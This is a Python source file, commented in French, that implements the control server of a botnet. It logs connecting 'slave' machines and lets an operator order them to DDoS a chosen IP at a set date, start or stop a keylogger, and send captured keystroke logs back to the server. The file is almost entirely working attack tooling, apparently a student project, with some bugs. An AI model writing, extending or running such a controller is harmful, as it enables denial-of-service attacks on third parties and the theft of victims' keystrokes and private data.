#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
#importation de threading, afin d'allouer des processus à différentes action
#importation de time afin de créer des pauses lors de certaines action
import socket as modSocket
import argparse
import threading
import time

lock = threading.Lock()


"""
creation de l'objet Connexion, composé de 9 champs et 2 méthodes

1ère methode : elle va permettre d'écouter sur un port donné, et enregistrera les ip des machines connecté pendant l'écoute
dans un fichier "ListeIP.txt", une fois terminé elle vas faire appelle à la méthode receive situé dans le même objet.

2ème methode : elle va permettre de se connecter à plusieurs machines, grace à leur ip enregistrés dans le fichier "ListeIP.txt"
une fois terminer elle va lancer l'interface choix, qui vas nous affciher les menus des actions.

Ces 2 méthodes sont allouer à un processus chacun

"""

class Connexion():
    def __init__(self, adresseMachine, carteReseauEcoute, listeIP, port, fichier, chemin, ip, date, clients, nbLine):
        self.adresseMachine = adresseMachine
        self.carteReseauEcoute = carteReseauEcoute
        self.listeIP = listeIP
        self.port = port
        self.fichier = fichier
        self.chemin = chemin
        self.ip = ip
        self.date = date
        self.clients = clients
        self.nbLine = nbLine

    def listen(self, carteReseauEcoute, port, fichier, clients, date, nbLine):
        carteReseauEcoute.bind(("", port))
        carteReseauEcoute.listen()
        while True:
            print("Attente de connexion")
            connReseau, addr = carteReseauEcoute.accept()
            connReseau.recv(1024)
            listeIP.append(addr[0])
            clients.append(connReseau)
            i = 0
            print(listeIP)
            print ("L'IP du slave est : ", listeIP[i])
            i+=1
            fichier.write(str(listeIP))       
            fichier.seek(0)
            time.sleep(2)
            essai = threading.Thread(target=objetChoixAction.choix, args=(connReseau, ))
            essai.start()

    def choix(self, connReseau):
        #petit choix multiple afin de savoir quelle methode on doit lancer
        select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        while select != 5:
            #on essaie le choix multiple
            try:
                if select == 1:
                    lock.acquire()
                    date = input("date pour le ddos, format(yyyy-mm-jj hh:mm) : ")
                    #lance la methode ddos de l'objet choixAction
                    objetChoixAction.ddos(connReseau, ip, date)
                    lock.release()
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 2:
                    #lance la methode start de l'objet choixAction
                    objetChoixAction.start_log(listeIP, connReseau)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 3:
                    #lance la methode stop de l'objet choixAction
                    objetChoixAction.stop_log(connReseau)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 4:
                    nbLine = input("Combien de ligne voulez vous pour le get_log : ")
                    #lance la methode get de l'objet choixAction
                    objetChoixAction.get_log(connReseau, chemin, nbLine)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
            #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
            except ConnectionAbortedError:
                print("connexion arretée par le client")
        for add in clients:
            print("Fin du programme")
            fichier.close()
            carteReseauEcoute.close()
            add.send("FIN".encode("utf-8"))
            pass

    def start_log(self, listeIP, connReseau):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie "keylogger" au client
        for add in self.clients:
            add.send("keylogger".encode("utf-8"))

    def ddos(self, connReseau, ip, date):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        #demande a l'utilsateur la date pour le ddosa vec un format établi
        #envoie "ddos" au client
        for add in self.clients: 
            add.send("ddos".encode("utf-8"))
            #envoie ce qui est contenu dans la variable date
            add.send(date.encode("utf-8"))
            #pause de 20 milli seconde
            time.sleep(0.2)
            #et on envoie enfin la variable ip(entré dans l'argparse)
            add.send(ip.encode("utf-8"))
        

    
    def stop_log(self, connReseau):
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        #envoie "stop" au client
        for add in self.clients: 
            add.send("stop".encode("utf-8"))
            message = add.recv(1024).decode("utf-8")
            if message == "logger arreté":
                print(message)
            else:
                print(message)

    def get_log(self, connReseau, chemin, nbLine):
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        #envoie "transfert" au client 
        for add in self.clients:
            add.send("transfert".encode("utf-8"))
            #on demande le nombre de ligne que l'on veut pour le transfert
            #on envoie la variable nbLine
            add.send(nbLine.encode("utf-8"))
            #on ouvre le fichier chemin(variable entré dans l'argparse) que l'on met dans la variable fichier
            fichier = open(chemin, "wb")
            #on reçoit les infos du keylogger
            l = add.recv(1024)
            print("salut")
            #on écris ces infos dans la variable fichier
            fichier.write(l)

    

#on initie les différents champs présents dans l'objet Connexion
fichier = open("ListeIP.txt", "a")
listeIP = []
chemin = ""
ip= ""
date = ""
clients = []
port = ""
nbLine = ""
adresseMachine = ("localhost", 5000)
#carte reseau qui va nous servire pour la première méthode de l'objet Connexion
carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#on assigne l'objet choixAction qui est l'enfant de l'objet Connexion à la variable objetChoixAction
objetChoixAction = Connexion(adresseMachine, carteReseauEcoute, listeIP, port, fichier, chemin, ip, date, clients, nbLine)

#initiation d'argparse avec les arguments
parser = argparse.ArgumentParser()
#creation de la commande --listen
parser.add_argument("--listen", type=int,
                     help="Ecoute sur un port donné et liste les IP connectées, pour le lancer il faut mettre le n° du port")
#creation de la commande --upload
parser.add_argument("--upload", type=str,
                     help="upload le fichier du keylogger, il faut entrez le chemin du fichier" )
#creation de la commande --ip
parser.add_argument("--ip", type=str,
                     help="envoie des paquets ipv4 sur une adresse donné, pour le lancer suffit de mettre l'ip du serveur a ddos")
parser.add_argument("--conn", type=int,
                     help="se connecte sur un port donné et liste les IP connectées")
#on initie la variable args, qui va contenire les arguments
args = parser.parse_args()

#si --listen est entré on executera ce qui est entrer
if args.listen:

    #on entre la variable chemin qui va prendre l'argument entrer lors de la commande --upload
    chemin = args.upload
    print(chemin)
    #on entre la variable ip qui va prendre l'argument entrer lors de la commande --ip
    ip = args.ip
    print(ip)
    #on entre la variable port qui va prendre l'argument entrer lors de la commande --listen
    port = args.listen
    print(port)
    #on lance la première methode de l'objet Connexion en lui allouant un thread
    objetChoixAction.listen(carteReseauEcoute, port, fichier, clients, nbLine, date)

    







